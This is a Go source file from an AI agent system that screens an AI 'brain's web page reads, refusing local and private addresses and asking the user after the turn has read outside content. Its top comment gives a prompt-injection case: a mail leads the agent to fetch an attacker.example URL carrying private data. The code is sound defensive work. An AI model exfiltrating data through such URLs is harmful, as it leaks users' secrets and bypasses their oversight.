package main

import (
	"context"
	"fmt"
	"log"
	"net/netip"
	"net/url"
	"strings"
)

// The brain's web, as decided in the study "Recherche web du cerveau"
// (2026-10-27). It searches with its harness's own search (Claude Code's
// WebSearch is allowed in advance; Codex is held to its cached index by the
// node; OpenCode has none). It reads a page with its harness's reader, and
// every read comes here, since a URL is also a way out: a brain talked into
// it by a mail could "read" https://attacker.example/?q=<something private>.
//
//   - a URL that is not http(s), or names this machine or the local network
//     (localhost, a private or loopback IP, a name without a dot), is refused:
//     the node's egress relay enforces it for every task, this is defence in
//     depth;
//   - a rule of mine about WebFetch that denies or asks wins;
//   - on a clean turn, the read is free;
//   - on a tainted turn, it is mine to decide, unless the URL is written in
//     my own message of this turn: I chose it, the brain added nothing to it.
//
// A read is itself external content: it taints the turn (turnTaint).

// noWebSearchLine tells a brain whose harness has no web search of its own.
const noWebSearchLine = "Ton harnais n'a pas de recherche web : si une demande en a besoin, dis-le en une ligne et propose une tâche (`run_task`) ou une adresse à lire."

// webFetchTool is the name every harness's page reader reaches eriphe-core
// under (OpenCode's webfetch is renamed by the node).
const webFetchTool = "WebFetch"

// webURL is the URL of a page read's input.
func webURL(input any) string {
	in, _ := input.(map[string]any)
	u, _ := in["url"].(string)
	return strings.TrimSpace(u)
}

// pendingFetches counts the page reads a brain's permissions wait on, by URL.
func pendingFetches(perms []map[string]any) map[string]int {
	out := map[string]int{}
	for _, p := range perms {
		if fmt.Sprint(p["tool_name"]) == webFetchTool {
			out[webURL(p["input"])]++
		}
	}
	return out
}

// brainFetch decides a brain's page read (see above).
func (c *core) brainFetch(ctx context.Context, t *TaskRow, pid string, input map[string]any, pending map[string]int) error {
	raw := webURL(input)
	if why := localURL(raw); why != "" {
		log.Printf("brain: WebFetch %s refused: %s", truncate(raw, 200), why)
		no := false
		_, err := c.answer(ctx, t.ID, pid, "Refusé par la politique d'Eriphe : "+why+".", &no, byPolicy)
		return err
	}
	switch decision, reason := c.decide(webFetchTool, input); decision {
	case decideDeny:
		log.Printf("brain: WebFetch %s refused by a rule: %s", truncate(raw, 200), reason)
		no := false
		_, err := c.answer(ctx, t.ID, pid, "Refusé par la politique d'Eriphe : "+reason+".", &no, byPolicy)
		return err
	case decideAsk:
		return c.brainFetchAsk(t, pid, raw, reason)
	}
	if tainted := c.turnTaintBut(pending); len(tainted) > 0 {
		if !c.ownerWroteURL(raw) {
			return c.brainFetchAsk(t, pid, raw, "Eriphe a lu un contenu extérieur dans ce tour ("+strings.Join(tainted, ", ")+")")
		}
		log.Printf("brain: WebFetch %s allowed on a tainted turn: the URL is in the user's message", truncate(raw, 200))
	} else {
		log.Printf("brain: WebFetch %s allowed: clean turn", truncate(raw, 200))
	}
	yes := true
	_, err := c.answer(ctx, t.ID, pid, "", &yes, byPolicy)
	return err
}

// brainFetchAsk hands a page read to me, told in the conversation.
func (c *core) brainFetchAsk(t *TaskRow, pid, raw, reason string) error {
	log.Printf("brain: WebFetch %s is the user's decision: %s", truncate(raw, 200), reason)
	c.store.markUserOnly(t.ID, pid, reason)
	c.store.addMessage(roleBrain, fmt.Sprintf("(Eriphe veut lire la page %s : %s. Autorise ou refuse dans `eriphe`, tâche %s.)",
		truncate(raw, 400), reason, t.ID), true)
	return nil
}

// ownerWroteURL tells whether a URL is written in one of my messages of the
// brain's current turn (with or without its scheme or a final slash).
func (c *core) ownerWroteURL(raw string) bool {
	from, to, _, _ := c.turn.snapshot()
	if from <= 0 || to < from || raw == "" {
		return false
	}
	bare := strings.TrimSuffix(raw, "/")
	if s, ok := strings.CutPrefix(bare, "https://"); ok {
		bare = s
	} else if s, ok := strings.CutPrefix(bare, "http://"); ok {
		bare = s
	}
	if len(bare) < 4 || !strings.Contains(bare, ".") {
		return false
	}
	msgs, err := c.store.messagesAfter(from-1, to-from+1)
	if err != nil {
		return false
	}
	for _, m := range msgs {
		if m.Seq >= from && m.Seq <= to && m.Role == roleUser && strings.Contains(m.Text, bare) {
			return true
		}
	}
	return false
}

// localURL tells why a URL must not be read from the brain's node: it is
// not http(s), or it names this machine or the local network. Only what
// can be told without a lookup: a name that resolves to a private address
// is the egress relay's to stop.
func localURL(raw string) string {
	u, err := url.Parse(raw)
	if err != nil || u.Host == "" {
		return "adresse illisible"
	}
	if u.Scheme != "http" && u.Scheme != "https" {
		return "seuls http et https se lisent"
	}
	if u.User != nil {
		return "une adresse avec identifiants ne se lit pas"
	}
	host := strings.TrimSuffix(strings.ToLower(u.Hostname()), ".")
	const local = "le réseau local et cette machine ne se lisent pas"
	if ip, err := netip.ParseAddr(strings.Trim(host, "[]")); err == nil {
		ip = ip.Unmap()
		if !ip.IsGlobalUnicast() || ip.IsPrivate() || ip.IsLoopback() || cgnat.Contains(ip) {
			return local
		}
		return ""
	}
	if !strings.Contains(host, ".") {
		return local // localhost, a machine's name on the network, or an IP in another notation
	}
	for _, suffix := range []string{".localhost", ".local", ".lan", ".home", ".internal", ".intranet", ".home.arpa", ".localdomain"} {
		if strings.HasSuffix(host, suffix) {
			return local
		}
	}
	// 127.1, 0x7f.0.0.1, 010.0.0.1: an IP the parser does not take is
	// still one to the resolver.
	if strings.Trim(host, "0123456789.") == "" || strings.HasPrefix(host, "0x") || strings.Contains(host, ".0x") {
		return local
	}
	return ""
}

// cgnat is the shared address space (RFC 6598), Tailscale's among others.
var cgnat = netip.MustParsePrefix("100.64.0.0/10")
